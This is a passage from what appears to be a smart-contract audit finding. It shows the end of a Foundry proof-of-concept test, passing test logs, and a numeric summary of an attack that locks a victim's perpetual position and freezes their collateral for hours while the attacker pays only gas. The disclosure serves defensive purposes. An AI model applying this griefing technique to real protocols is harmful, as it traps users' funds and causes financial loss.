        (uint256 lockedHours, uint256 exits,, uint64 pid) = _weekend(false);
        uint64 live = pviews.getPositionProtection(pid).linkedOrderId;
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(KEEPER);
        router.executeOrder(live, new bytes[](0)); // frozen close at the frozen mark (frozen spread paid)
        (uint256 sizeAfter,,,,,,) = engine.positions(VICTIM);
        emit log_named_uint("hours without an exit (control) ", lockedHours);
        emit log_named_uint("owner exit calls that succeeded ", exits);
        emit log_named_uint("position after frozen close     ", sizeAfter);
        assertGt(exits, 0, "owner amended and re-queued in the first hour");
        assertEq(sizeAfter, 0, "owner exited during the frozen window");
    }

}
```

## Output

```
Ran 6 tests for test/perps/LatchedProtectionRetryLock.t.sol:LatchedProtectionRetryLockTest
[PASS] test_Control_OwnerAmendsAndExits() (gas: 5828744)
Logs:
  owner USDG start                : 10000000000
  owner USDG end (control)        : 9494429994

[PASS] test_Control_WeekendOwnerTakesFrozenClose() (gas: 18291917)
Logs:
  hours without an exit (control) : 0
  owner exit calls that succeeded : 2
  position after frozen close     : 0

[PASS] test_KeeperFirstOrderingAndPassiveExpiredLock() (gas: 5860699)
Logs:
  attacker gas, backrun retry only: 668749

[PASS] test_OwnerExitRevertReasonsWhileLocked() (gas: 5427397)
[PASS] test_OwnerHeldInPositionForThreeHours() (gas: 234857761)
Logs:
  seconds locked (live market)    : 10800
  attacker cycles                 : 216
  owner exit calls that succeeded : 0
  attacker gas per cycle (live)   : 1217098
  position size during the lock   : 100000000000000000000000
  collateral frozen (USDG atoms)  : 5953732700
  index when the owner got out    : 100899953
  owner USDG start                : 10000000000
  owner USDG end (balance + withdrawn free): 9019269154

[PASS] test_WeekendLockAtLeast24Hours() (gas: 54996140)
Logs:
  attacker gas per cycle (frozen) : 946755
  consecutive hours, no owner exit: 47
  owner exit calls that succeeded : 0
  collateral frozen at hour 24    : 4953350776
  attacker cycles (one per hour)  : 47
  oracle frozen at end (1=yes)    : 0
  position open at end of window : 100000000000000000000000
  protection status (3=Triggered) : 3

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 743.26ms (1.02s CPU time)

Ran 1 test suite in 759.97ms (743.26ms CPU time): 6 tests passed, 0 failed, 0 skipped (6 total tests)
```

## Reading the numbers

- **Weekend:** 47 consecutive hours with no successful owner exit call, held by 47 frozen cycles. The mark is fixed, so the lock does not depend on price. At hour 24, 4,953,350,776 atoms (4,953.35 USDG) of position collateral cannot be withdrawn. In the control, the owner exits in the first hour.
- **Live:** for 10,800 s, 0 of 216 × 5 owner exit calls succeed, and 5,953.73 USDG of position collateral is non-withdrawable. The lock lasts while the price stays beyond the owner's ceiling. In this +0.50% path, the owner's final value is 9,019.27 USDG, against 9,494.43 USDG in the control.
- **Gas:** the attacker pays gas only — 1,217,098 per live cycle, 946,755 per frozen cycle and 668,749 per backrun retry.

